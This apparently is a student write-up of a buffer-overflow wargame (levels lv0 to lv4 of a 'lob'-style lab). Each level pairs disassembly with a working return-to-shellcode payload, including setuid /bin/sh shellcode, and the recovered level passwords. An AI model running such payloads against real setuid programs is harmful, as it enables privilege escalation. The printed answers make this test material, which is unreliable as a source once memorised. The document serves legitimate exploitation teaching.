---
title: 1-0 Wargame Writeup [lv0~lv3]
tags: assignment1 wargame bof lob lv0 lv1 lv2 lv3
---

## 0. lv0 > lv1
```bash
-rwsr-sr-x 1 lv1 lv1 11987 Feb 25  2010 lv1
```
binary "lv1" allows the user to use the permission of user:lv1 upon execution. Let's disassemble this binary

```nasm
   0x08048439 <+9>:	cmp    DWORD PTR [ebp+0x8], 0x1
   0x0804843d <+13>:	jg     0x8048456 <main+38>
```
first, the program checks if argc is 1 and exits the program if true.
If not, program continues

```nasm
   0x08048456 <+38>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048459 <+41>:	add    eax,0x4
   0x0804845c <+44>:	mov    edx,DWORD PTR [eax]
   0x0804845e <+46>:	push   edx
   0x0804845f <+47>:	lea    eax,[ebp-0x100]
   0x08048465 <+53>:	push   eax
   0x08048466 <+54>:	call   0x8048370 <strcpy@plt>
   0x0804846b <+59>:	add    esp,0x8
   0x0804846e <+62>:	lea    eax,[ebp-0x100]
   0x08048474 <+68>:	push   eax
   0x08048475 <+69>:	push   0x80484ec
   0x0804847a <+74>:	call   0x8048350 <printf@plt>  
```
the program then copies data from eax to ebp-0x100 using strcpy and prints the copied data using printf

ebp+0xc contains address for array of pointers that point to argv's. adding 4 to ebp+0xc gives address for argv[1], which contains the value that's being copied to ebp-0x100.

Since the program does not limit buffer size, it's vulnerable to BOF attacks. I used "Return To Shellcode" method to solve this problem.

the payload should contain:
1. nop
2. shellcode 
3. dummy data
4. approximate address of shellcode

following is the payload (260 bytes):
```bash
`python -c 'print "\x90"*165 + "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "A"*54 +  "\x38\xd0\xff\xff"'`
```
we can get the shell that has the uid of lv1

```bash
$ my-pass
hello newbie!
```
<br>

## 1. lv1 > lv2
```bash
-rwsr-sr-x 1 lv2  lv2  11970 Feb 25  2010 lv2
```
binary "lv2" has the same special permission as the previous "lv1". Let's take a deeper look.
```nasm
   0x08048453 <+35>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048456 <+38>:	add    eax,0x4
   0x08048459 <+41>:	mov    edx,DWORD PTR [eax]
   0x0804845b <+43>:	push   edx
   0x0804845c <+44>:	lea    eax,[ebp-0x10]
   0x0804845f <+47>:	push   eax
   0x08048460 <+48>:	call   0x8048370 <strcpy@plt>
```
lv2 is similar to previous lv1 but the copy destination is different. Its size is 0x10 which is too small to fit the shellcode (41 bytes).
So, lets use the shellcode stored in argv instead of the buffer.

Our payload should contain:
1. dummy data
2. return address
3. nop
4. shellcode

following is the payload i used:
```bash
`python -c 'print "\x90"*20+"\x30\xd4\xff\xff"+"\x90"*30+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
```

we got the shell!
```bash
$ my-pass
tooo easy
```
<br>

## 2. lv2 > lv3
```bash
-rwsr-sr-x 1 lv3  lv3   11824 Feb 25  2010 lv3
```
Same permissions. Lets take a look.
```nasm
   0x080483fe <+6>:	lea    eax,[ebp-0x10]
   0x08048401 <+9>:	push   eax
   0x08048402 <+10>:	call   0x804830c <gets@plt>
```
this program uses gets to store input from stdin to buffer.

payload structure:
1. dummy data
2. return address
3. nop
4. shellcode

payload used:
```bash
(python -c'print "A"*20+"\x30\xd2\xff\xff"+"\x90"*20+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"';cat)
```

we can get the shell by passing this to lv3 via pipe
```bash
my-pass
i dont like stdin
```

<br>

## 3. lv3 > lv4
```bash
-rwsr-sr-x 1 lv4  lv4  12567 Apr 26 13:17 lv4
```
Same permissions. Disassembly time:
```nasm
   0x08048506 <+6>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x0804850a <+10>:	jg     0x8048523 <main+35>
```
First it checks argc and exit if it's 1
```nasm
   0x08048524 <+36>:	mov    DWORD PTR [ebp-0x2c],0x0
   0x0804852b <+43>:	nop
   0x0804852c <+44>:	lea    esi,[esi+eiz*1+0x0]
   0x08048530 <+48>:	mov    eax,DWORD PTR [ebp-0x2c]
   0x08048533 <+51>:	lea    edx,[eax*4+0x0]
   0x0804853a <+58>:	mov    eax,ds:0x8049750
   0x0804853f <+63>:	cmp    DWORD PTR [eax+edx*1],0x0
   0x08048543 <+67>:	jne    0x8048547 <main+71>
   0x08048545 <+69>:	jmp    0x8048587 <main+135>	;for loop exit
   0x08048547 <+71>:	mov    eax,DWORD PTR [ebp-0x2c]
   0x0804854a <+74>:	lea    edx,[eax*4+0x0]
   0x08048551 <+81>:	mov    eax,ds:0x8049750
   0x08048556 <+86>:	mov    edx,DWORD PTR [eax+edx*1]
   0x08048559 <+89>:	push   edx
   0x0804855a <+90>:	call   0x80483f0 <strlen@plt>
   0x0804855f <+95>:	add    esp,0x4
   0x08048562 <+98>:	mov    eax,eax
   0x08048564 <+100>:	push   eax
   0x08048565 <+101>:	push   0x0
   0x08048567 <+103>:	mov    eax,DWORD PTR [ebp-0x2c]
   0x0804856a <+106>:	lea    edx,[eax*4+0x0]
   0x08048571 <+113>:	mov    eax,ds:0x8049750
   0x08048576 <+118>:	mov    edx,DWORD PTR [eax+edx*1]
   0x08048579 <+121>:	push   edx
   0x0804857a <+122>:	call   0x8048430 <memset@plt>	;void * memset ( void * ptr, int value, size_t num );
   0x0804857f <+127>:	add    esp,0xc
   0x08048582 <+130>:	inc    DWORD PTR [ebp-0x2c]
   0x08048585 <+133>:	jmp    0x8048530 <main+48>
```
Then it goes through environment values and overwrites them with zero using memset. Our previous payloads does not make any use of env values, so this shouldn't be a problem.

```nasm
   0x08048587 <+135>:	mov    eax,DWORD PTR [ebp+0xc]	;address of argv array (eax = argv[0])
   0x0804858a <+138>:	add    eax,0x4			;second item of argv array (eax = argv[1])
   0x0804858d <+141>:	mov    edx,DWORD PTR [eax]	;pointer of argv[1] value (edx = *argv[1])
   0x0804858f <+143>:	add    edx,0x2f			;0x2f th char of argv[1] value (edx = &argv[1][0x2f])
   0x08048592 <+146>:	cmp    BYTE PTR [edx],0xff
   0x08048595 <+149>:	je     0x80485b0 <main+176>
```
After the for loop of erasing env's, it compares argv[1] value's 0x2f th byte with 0xff
```nasm
   0x080485b0 <+176>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080485b3 <+179>:	add    eax,0x4
   0x080485b6 <+182>:	mov    edx,DWORD PTR [eax]
   0x080485b8 <+184>:	push   edx
   0x080485b9 <+185>:	lea    eax,[ebp-0x28]
   0x080485bc <+188>:	push   eax
   0x080485bd <+189>:	call   0x8048440 <strcpy@plt>
```
Then it copies argv[1] value to ebp-0x28. Since the buffer size is 0x28, return address should start at 0x2c th byte. Which means 0x2f is the last byte of return address. Considering the fact that i386 uses little-endian, the previous step was meant to check if return address was pointing to an address starting with 0xff.

payload structure should be similar to previous ones:
1. dummy data
2. return address
3. nop
4. shell code

by using:
```bash
`python -c 'print "\x90"*44+"\xa0\xd1\xff\xff"+"\x90"*30+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
```
I got the shell:
```bash
$ my-pass
broken egg
```
 
